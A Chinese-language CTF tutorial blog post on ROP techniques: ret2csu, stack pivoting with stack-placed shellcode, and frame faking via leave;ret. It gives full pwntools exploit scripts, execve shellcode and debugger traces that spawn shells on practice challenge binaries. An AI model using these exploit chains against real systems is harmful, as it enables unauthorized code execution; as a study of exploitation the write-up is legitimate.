---
title: ROP tricks
tags:
  - binary
---
> 以前学的时候没注意到，今天补个档。算是接栈溢出《栈溢出：靶向打击》的尾了。

## ret2csu

__libc_csu_init函数是对libc进行初始化的一个函数。在64位寄存器传参时有奇效。

```assembly
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14
.text:0000000000400696                 mov     edi, r15d
.text:0000000000400699                 call    qword ptr [r12+rbx*8]
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
.text:00000000004006B4 ; } // starts at 400650
.text:00000000004006B4 __libc_csu_init endp
```

**4006A1~4006A4**处，我们设置rbx=0,rbp=1就可以简单绕过检查。之后填入7*8字节的垃圾数据即可返回。

**40057A~400582**处，我们可以伪造栈上数据来控制rbx,rbp,r12,r13,r14,r15的值。

**400560~400569**，我们可以把r13赋给rdx，把r14赋给rsi，把r15d赋给edi，然后执行[r12+rbx*8]处的函数。(注意此处已设置rbx=0，所以其实是call [r12]，注意是call的是r12处存的函数指针)。

所以基本的payload可以这么构造：

```python
payload = 'a'*offset + p64(csu_1) + p64(0) + p64(1) 
payload +=+ p64(call_addr) + p64(rdx) + p64(rsi) + p64(rdi) # 注意call_addr直接写got地址
```

这里拿jarvisoj_level3_x64来演示一下。。。

第一阶段，泄露libc：

```python
payload = 'a'*0x88 + p64(csu_1) + p64(0) + p64(1) + p64(elf.got['write']) + p64(0x8) + p64(elf.got['write']) + p64(1) + p64(csu_2) + p64(0) * 7 + p64(main)
```

在call qword ptr [r12+rbx*8]处下断点，得到

```assembly
───────[ DISASM ]────────
 ► 0x400699 <__libc_csu_init+73>    call   qword ptr [r12 + rbx*8] <0x7f1a47aa62b0>
        rdi: 0x1
        rsi: 0x600a58 (write@got.plt) —▸ 0x7f1a47aa62b0 (write) ◂— cmp    dword ptr [rip + 0x2d2489], 0
        rdx: 0x8
        rcx: 0x7f1a47aa6260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
```

紧接着：

```python
payload = 'a'*0x88 + p64(csu_1) + p64(0) + p64(1) + p64(elf.got['read']) + p64(0x16) + p64(bss) + p64(0) + p64(csu_2) + p64(0) * 7 + p64(main)
```

将execve和/bin/sh读入bss段。

```assembly
──────────────[ DISASM ]────────────────
 ► 0x400699 <__libc_csu_init+73>    call   qword ptr [r12 + rbx*8] <0x7facf5d96250>
        rdi: 0x0
        rsi: 0x600a88 (completed) ◂— 0x0
        rdx: 0x16
        rcx: 0x7facf5d96260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
```

最后执行execve('/bin/sh',0,0)

```python
payload = 'a'*0x88 + p64(csu_1) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(bss+8) + p64(csu_2) + p64(0) * 7 + p64(main)
```

```assembly
 ► 0x400699 <__libc_csu_init+73>    call   qword ptr [r12 + rbx*8] <0x7facf5d6b770>
        rdi: 0x600a90 ◂— 0x68732f6e69622f /* '/bin/sh' */
        rsi: 0x0
        rdx: 0x0
        rcx: 0x7facf5d96260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
```



## stack pivoting

wiki上只给了一个例子。是在栈上布置好shellcode，然后控制eip到栈上从而执行shellcode拿到shell。

利用以下payload进行栈转移：

`payload = shellcode + 'a'*(offset-len(shellcode)) + p64(jmp_esp_addr) + asm('sub esp,offset+ebp+ret;jmp esp')`

示例用的是buuoj的xctf_b0verfl0w。

程序基本啥保护都没有开。

```sh
 ○ checksec b0verfl0w
[*] '/mnt/e/wsl/b0verfl0w'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

只有一个功能。

```c
signed int vul()
{
  char s; // [esp+18h] [ebp-20h]

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

在ROPgadget时找到了`jmp esp`的指令。

```sh
 ○ ROPgadget --binary ./b0verfl0w --only "jmp"
Gadgets information
============================================================
0x080483ab : jmp 0x8048390
0x080484f2 : jmp 0x8048470
0x08048611 : jmp 0x8048620
0x08048504 : jmp esp

Unique gadgets found: 4
```

直接在栈上布置shellcode然后控制eip执行它就行了。

```python
from pwn import *
io = remote('node3.buuoj.cn',26599)
elf = ELF('./b0verfl0w')
libc = ELF('./x86-libc-2.23.so')
context.log_level = 'debug'

shellcode ='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
jmp_esp = 0x08048504

payload = shellcode + 'a'*(0x24-len(shellcode)) + p32(jmp_esp) + asm('sub esp,0x28;jmp esp')
io.sendafter('name?',payload)
io.interactive()
```

## frame faking

在栈上伪造栈帧，然后利用`leave;ret`指令使得rsp被控制到指定位置，从而劫持rip。由于需要用到leave，frame faking的条件是能够泄露原来栈上的rsp。

基本payload构造：

`payload='a'*8 +p64(pop_rdi) + p64(argv_1) + … + 'a'*(offset-length) + p64(fake_rsp_add) + p64(leave_ret)`

引例是2018安恒杯的over。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3) 
{ 
	setvbuf(stdin, 0LL, 2, 0LL);
	setvbuf(stdout, 0LL, 2, 0LL);
 	while ( sub_400676() ) 
        ;
 	return 0LL; 
} 
int sub_400676() 
{ 
    char buf[80]; // [rsp+0h] [rbp-50h] 

	memset(buf, 0, sizeof(buf)); putchar('>');
	read(0, buf, 96uLL); 
	return puts(buf); 
}
```

一波泄露加system('/bin/sh\x00')

```python
from pwn import *
io = process('./over.over')
elf = ELF('./over.over')
libc = ELF('/mnt/e/wsl/x64-libc-2.23.so')

rdi = 0x0000000000400793
vul = 0x400676
leave = 0x00000000004006be

payload = 'a'*0x50
io.sendafter('>',payload)
stack_add = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x70
log.info('stack_addr = '+hex(stack_add))
payload = 'a'*0x8 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vul) + 'a'*(0x50-0x28) + p64(stack_add) + p64(leave)
io.sendafter('>',payload)
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.sym['puts']
log.info('libc_base = '+ hex(libc_base))
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
payload = 'a'*0x8 + p64(rdi) + p64(binsh) + p64(system)  + 'a'*(0x50-0x20) + p64(stack_add-0x30) + p64(leave)
io.sendafter('>',payload)
io.interactive()
```
